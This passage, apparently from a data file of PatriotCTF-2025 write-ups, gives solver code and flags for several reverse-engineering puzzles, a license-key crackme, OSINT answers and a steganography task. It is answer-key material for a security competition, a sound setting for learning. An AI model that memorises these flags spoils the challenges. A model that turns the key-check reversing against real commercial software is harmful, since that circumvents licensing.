uint8_t buffer[FLAG_LEN];\n    memcpy(buffer, TARGET, FLAG_LEN);</p>\n<p>// Reverse Operation 4: XOR each byte with its position\n    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] ^= i;\n    }</p>\n<p>// Reverse Operation 3: Subtract magic constant (mod 256)\n    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] = (buffer[i] - MAGIC_ADD) % 256;\n    }</p>\n<p>// Reverse Operation 2: Swap adjacent byte pairs\n    for (int i = 0; i &lt; FLAG_LEN; i += 2) {\n        uint8_t temp = buffer[i];\n        buffer[i] = buffer[i + 1];\n        buffer[i + 1] = temp;\n    }</p>\n<p>// Reverse Operation 1: XOR with rotating key\n    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] ^= XOR_KEY[i % 5];\n    }</p>\n<p>printf(\"Flag: %s\\n\", buffer);</p>\n<p>return 0;\n}\n</code></pre></p>\n<h3>The Solution</h3>\n<p>Compiling and running the <code>solver.c</code> program will print the flag:</p>\n<pre><code class=\"bash\">gcc solver.c -o solver\n./solver\n</code></pre>\n<p>This will output:</p>\n<pre><code class=\"\">Flag: PCTF{0x_M4rks_tH3_sp0t_M4t3ys}\n</code></pre>\n<h3>Conclusion</h3>\n<p>The \"Space Pirates\" challenge was a fun and classic reverse engineering problem. By carefully analyzing the transformations and applying their inverses in the reverse order, we were able to successfully recover the flag.\n[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "space-pirates-2",
                "title": "Space Pirates-2",
                "category": "Reverse Engineering",
                "tags": [
                    "cipher",
                    "xor",
                    "reverse"
                ],
                "writeup": "<p>The challenge is a Rust program that takes a 32-byte string as input, applies a series of six transformations to it, and compares the result to a hardcoded target value. To find the flag, we must reverse these transformations, starting from the target value, to recover the original input.</p>\n<p>The script <code>main.rs</code> helpfully describes each transformation and notes that they are all bijections, meaning they are all reversible.</p>\n<p>The transformations are applied in this order:\n1. <code>apply_quantum_cipher_v2</code>: XORs bytes with a 5-byte rotating key.\n2. <code>apply_stellar_rotation</code>: Rotates bytes left based on their position.\n3. <code>apply_spatial_transposition</code>: Swaps adjacent byte pairs.\n4. <code>apply_gravitational_shift_v2</code>: Subtracts a constant from each byte.\n5. <code>apply_temporal_inversion</code>: Reverses bytes in 5-byte chunks.\n6. <code>apply_coordinate_calibration_v2</code>: XORs each byte with its index squared.</p>\n<p>To solve the challenge, we must apply the inverse of these operations in the reverse order (6 down to 1) to the <code>TARGET</code> array.</p>\n<p>The inverse operations are:\n1. <strong>Reverse Coordinate Calibration</strong>: XOR is its own inverse, so we XOR each byte with its index squared.\n2. <strong>Reverse Temporal Inversion</strong>: Reversing is its own inverse, so we reverse the bytes in 5-byte chunks again.\n3. <strong>Reverse Gravitational Shift</strong>: The inverse of subtraction is addition. We add the <code>MAGIC_SUB</code> constant to each byte.\n4. <strong>Reverse Spatial Transposition</strong>: Swapping is its own inverse. We swap adjacent pairs again.\n5. <strong>Reverse Stellar Rotation</strong>: The inverse of a left rotation is a right rotation. We rotate each byte right by the same amount it was rotated left.\n6. <strong>Reverse Quantum Cipher</strong>: XOR is its own inverse. We XOR each byte with the corresponding key byte again.</p>\n<p>A solver program was created (<code>solve.rs</code>) that contained the <code>TARGET</code> data and the inverse functions. Running this program decrypts the <code>TARGET</code> array and prints the flag.</p>\n<p>Flag: PCTF{Y0U_F0UND_TH3_P1R4T3_B00TY}\n[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "space-pirates-3",
                "title": "Space Pirates-3",
                "category": "Reverse Engineering",
                "tags": [
                    "rsa",
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse"
                ],
                "writeup": "<p>This writeup explains how to solve the \"Space Pirates 3\" CTF challenge.</p>\n<p>The challenge is a Go program that takes a 30-character string as input and encrypts it through a series of six operations. The goal is to find the input string that produces a specific target hash.</p>\n<p>The six operations are:</p>\n<p>1.  <code>applyUltimateQuantumCipher</code>: XORs the input with a 7-byte key.\n2.  <code>applyStellarRotationV2</code>: Rotates each byte to the left by a specific amount based on its position.\n3.  <code>applySpatialTransposition</code>: Swaps every two adjacent bytes.\n4.  <code>applyGravitationalShiftV3</code>: Subtracts a constant value from each byte.\n5.  <code>applyTemporalInversionV2</code>: Reverses the order of the bytes in 6-byte chunks.\n6.  <code>applyCoordinateCalibrationV3</code>: XORs each byte with a value derived from its position in the string.</p>\n<p>To solve the challenge, we need to reverse these operations in the reverse order they were applied. This means starting with the target hash and applying the inverse of each operation, from step 6 back to step 1.</p>\n<p>The inverse operations are:</p>\n<p>1.  <code>reverseCoordinateCalibrationV3</code>: XOR each byte with the same position-derived value. This is the same as the original operation, as XOR is its own inverse.\n2.  <code>reverseTemporalInversionV2</code>: Reverse the bytes in 6-byte chunks again. This is also the same as the original operation.\n3.  <code>reverseGravitationalShiftV3</code>: Add the constant value to each byte.\n4.  <code>reverseSpatialTransposition</code>: Swap every two adjacent bytes again. This is the same as the original operation.\n5.  <code>reverseStellarRotationV2</code>: Rotate each byte to the right by the same amount.\n6.  <code>reverseUltimateQuantumCipher</code>: XOR the input with the same 7-byte key.</p>\n<p>By applying these inverse operations to the target hash, we can recover the original input string, which is the flag.</p>\n<p>The following Go program implements this logic:</p>\n<pre><code class=\"go\">package main\n<p>import \"fmt\"</p>\n<p>// The target encrypted vault combination (what we want the transformed input to become)\nvar target = [30]byte{\n\t0x60, 0x6D, 0x5D, 0x97, 0x2C, 0x04, 0xAF, 0x7C, 0xE2, 0x9E, 0x77, 0x85, 0xD1, 0x0F, 0x1D, 0x17, 0xD4, 0x30, 0xB7, 0x48, 0xDC, 0x48, 0x36, 0xC1, 0xCA, 0x28, 0xE1, 0x37, 0x58, 0x0F,\n}</p>\n<p>// The Pirate King's ULTIMATE XOR key (7 bytes - prime number for better mixing!)\nvar xorKey = [7]byte{0xC7, 0x2E, 0x89, 0x51, 0xB4, 0x6D, 0x1F}</p>\n<p>// NEW: Rotation pattern (8 bytes, includes rotation by 0 which is identity)\nvar rotationPattern = [8]uint{7, 5, 3, 1, 6, 4, 2, 0}</p>\n<p>// The Pirate King's subtraction constant (much larger than before!)\nconst magicSub byte = 0x93</p>\n<p>// Chunk size for reversal (changed from 5 to 6!)\nconst chunkSize = 6</p>\n<p>// rotateRight rotates a byte right by n positions (inverse of rotateLeft)\nfunc rotateRight(b byte, n uint) byte {\n\tn = n % 8 // Ensure n is in range [0,7]\n\treturn (b &gt;&gt; n) | (b &lt;&lt; (8 - n))\n}</p>\n<p>// Inverse of OPERATION 6: applyCoordinateCalibrationV3\nfunc reverseCoordinateCalibrationV3(buffer []byte) {\n\tfor i := range buffer {\n\t\tpositionValue := ((i * i) + i) % 256\n\t\tbuffer[i] ^= byte(positionValue)\n\t}\n}</p>\n<p>// Inverse of OPERATION 5: applyTemporalInversionV2\nfunc reverseTemporalInversionV2(buffer []byte) {\n\tfor chunkStart := 0; chunkStart &lt; len(buffer); chunkStart += chunkSize {\n\t\tchunkEnd := chunkStart + chunkSize\n\t\tif chunkEnd &gt; len(buffer) {\n\t\t\tchunkEnd = len(buffer)\n\t\t}\n\t\tfor i, j := chunkStart, chunkEnd-1; i &lt; j; i, j = i+1, j-1 {\n\t\t\tbuffer[i], buffer[j] = buffer[j], buffer[i]\n\t\t}\n\t}\n}</p>\n<p>// Inverse of OPERATION 4: applyGravitationalShiftV3\nfunc reverseGravitationalShiftV3(buffer []byte) {\n\tfor i := range buffer {\n\t\tbuffer[i] += magicSub\n\t}\n}</p>\n<p>// Inverse of OPERATION 3: applySpatialTransposition\nfunc reverseSpatialTransposition(buffer []byte) {\n\tfor i := 0; i &lt; len(buffer)-1; i += 2 {\n\t\tbuffer[i], buffer[i+1] = buffer[i+1], buffer[i]\n\t}\n}</p>\n<p>// Inverse of OPERATION 2: applyStellarRotationV2\nfunc reverseStellarRotationV2(buffer []byte) {\n\tfor i := range buffer {\n\t\trotation := rotationPattern[i%len(rotationPattern)]\n\t\tbuffer[i] = rotateRight(buffer[i], rotation)\n\t}\n}</p>\n<p>// Inverse of OPERATION 1: applyUltimateQuantumCipher\nfunc reverseUltimateQuantumCipher(buffer []byte) {\n\tfor i := range buffer {\n\t\tbuffer[i] ^= xorKey[i%len(xorKey)]\n\t}\n}</p>\n<p>func main() {\n\tbuffer := target[:]</p>\n<p>// Apply inverse operations in reverse order\n\treverseCoordinateCalibrationV3(buffer)\n\treverseTemporalInversionV2(buffer)\n\treverseGravitationalShiftV3(buffer)\n\treverseSpatialTransposition(buffer)\n\treverseStellarRotationV2(buffer)\n\treverseUltimateQuantumCipher(buffer)</p>\n<p>fmt.Printf(\"Found flag: %s\\n\", string(buffer))\n}\n</code></pre></p>\n<p>Running this program will print the flag:</p>\n<pre><code class=\"\">PCTF{M4ST3R_0F_TH3_S3V3N_S34S}\n</code></pre>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "vorpal-masters",
                "title": "Vorpal Masters",
                "category": "Reverse Engineering",
                "tags": [
                    "reverse"
                ],
                "writeup": "<h3>\ud83d\udd0d Challenge Summary</h3>\n<p>We are given a binary that prompts the user for a license key using the format:</p>\n<p><code>xxxx-xxxx-xxxxxxxxxx</code></p>\n<p>Our objective is to reverse engineer the binary, determine the validation logic, and generate a valid license key.</p>\n<p>---</p>\n<h3>\ud83e\udde9 Program Analysis</h3>\n<p>The key input is parsed using:</p>\n<p><code>scanf(\"%4s-%d-%10s\", &local_11, &local_20, local_1c);</code></p>\n<p>The key is split into:</p>\n<p>|Segment|Content Type|Target Variable|\n|---|---|---|\n|First|4 characters|local_11 \u2026 local_e|\n|Second|Integer|local_20|\n|Third|10 characters|local_1c|</p>\n<p>---</p>\n<h3>1\ufe0f\u20e3 First Segment Validation</h3>\n<p>The binary checks:</p>\n<p><code>if(local_11 != 'C' || local_f != 'C' || local_e != 'I' || local_10 != 'A')     womp_womp();</code></p>\n<p>Due to structure layout, the correct order of the first 4 characters is:</p>\n<p><code>CACI</code></p>\n<p>\u2714 Required first segment \u21d2 <code>CACI</code></p>\n<p>---</p>\n<h3>2\ufe0f\u20e3 Second Segment Validation</h3>\n<p>Must be in range:</p>\n<p><code>-5000 < local_20 < 10000</code></p>\n<p>and satisfy:</p>\n<p><code>(local_20 + 22) % 1738 == (((local_20 * 2) % 2000) * 6) + 9</code></p>\n<p>We brute-forced all valid values in the range and found <strong>exactly one solution</strong>:</p>\n<p><code>local_20 = 2025</code></p>\n<p>\u2714 Required middle number \u21d2 <code>2025</code></p>\n<p>---</p>\n<h3>3\ufe0f\u20e3 Third Segment Validation</h3>\n<p>The string must match exactly:</p>\n<p><code>strcmp(local_1c, \"PatriotCTF\") == 0</code></p>\n<p>\u2714 Required last segment \u21d2 <code>PatriotCTF</code></p>\n<p>---</p>\n<h3>\ud83c\udfaf Final Valid License Key</h3>\n<p><code>CACI-2025-PatriotCTF</code></p>\n<p>Entering this into the program yields:</p>\n<p><code>License key registered, you may play the game now!</code></p>\n<p>---</p>\n<h3>\ud83c\udfc1 Conclusion</h3>\n<p>By reversing the validation checks and solving a modular arithmetic constraint, we successfully obtained the only valid key:</p>\n<p>> <strong>CACI{CACI-2025-PatriotCTF}</strong></p>\n<p>Challenge solved \ud83d\ude80\n[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "waldo's-adventures",
                "title": "Waldo's Adventures",
                "category": "OSINT",
                "tags": [],
                "writeup": "<p>pctf{Thompson_Hall}</p>\n<p>Waldo-3\npctf{Center_for_the_Arts_Concert_Hall}</p>\n<p>Waldo-1\npctf{Horizon_Hall}</p>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "word-sea-adventures",
                "title": "Word Sea Adventures",
                "category": "Forensics",
                "tags": [
                    "steg",
                    "image"
                ],
                "writeup": "<p>The challenge is a docx file. A docx file is a zip archive.\nUnzip the file using <code>unzip word_sea_adventures.docx -d word_sea_adventures</code>.</p>\n<p>This extracts the contents of the docx file into a directory named <code>word_sea_adventures</code>.\nInside this directory, we find several files, including images and XML files.</p>\n<p>The <code>document.xml</code> file contains a hint: \"Word documents share a similar secret: although they appear as a single file, they are really like little 'zipped-up' bottles of fun.\" This confirms that we are on the right track by unzipping the file.</p>\n<p>We then use the <code>steghide</code> tool to check for hidden data in the image files.\n<code>steghide extract -sf word_sea_adventures/crab.jpg</code> extracts a file named <code>decoy2.txt</code>.\nThe content of <code>decoy2.txt</code> is \"Mr Crabs heard that his cashier may be hiding some money and maybe a flag somewhere.\"</p>\n<p>This hint points to the cashier of the Krusty Krab, who is Squidward.\nWe then use <code>steghide</code> on the <code>squid.jpg</code> file:\n<code>steghide extract -sf word_sea_adventures/squid.jpg</code></p>\n<p>This extracts a file named <code>flag.txt</code>.\nThe content of <code>flag.txt</code> is:\nI guess you found handsome squidward... even his looks can't hide the flag.\ntctf{w0rD_f1le5_ar3_als0_z1p}</p>\n<p>[[PatriotCTF-2025]]</p>\n"
            }
        ]
    }
};